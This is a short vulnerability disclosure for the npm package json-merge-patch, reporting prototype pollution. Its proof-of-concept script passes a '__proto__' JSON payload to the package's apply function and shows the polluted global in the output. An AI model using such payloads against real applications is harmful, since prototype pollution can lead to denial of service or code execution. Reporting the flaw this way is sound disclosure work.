# Description

`json-merge-patch` is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
let jsonmergepatch = require("json-merge-patch");
jsonmergepatch.apply({}, JSON.parse('{ "__proto__": { "polluted": "Yes! Polluted" }}'));
console.log(polluted);
```
2. Execute the following commands in another terminal:

```bash
npm i json-merge-patch # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Yes! Polluted
```
